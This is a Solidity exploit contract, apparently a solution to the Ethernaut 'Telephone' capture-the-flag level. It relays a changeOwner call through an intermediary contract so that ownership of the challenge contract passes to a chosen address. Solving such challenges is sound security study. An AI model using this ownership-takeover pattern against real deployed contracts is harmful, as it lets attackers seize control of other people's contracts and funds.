// SPDX-License-Identifier: MIT
// Original challenge at: https://ethernaut.openzeppelin.com/level/0x1ca9f1c518ec5681C2B7F97c7385C0164c3A22Fe
pragma solidity ^0.8.0;

contract TelephoneChanger {

  address public owner;
  Telephone telephone;
  address level = 0xF4d8f01fC9c46CEA5C5B51aD36130FF07710dfB5;

  constructor() {
    telephone = Telephone(level);
  }

  function changeOwner(address _owner) public {
    telephone.changeOwner(_owner);
  }
}

abstract contract Telephone {
    function changeOwner(address _owner) external virtual;
}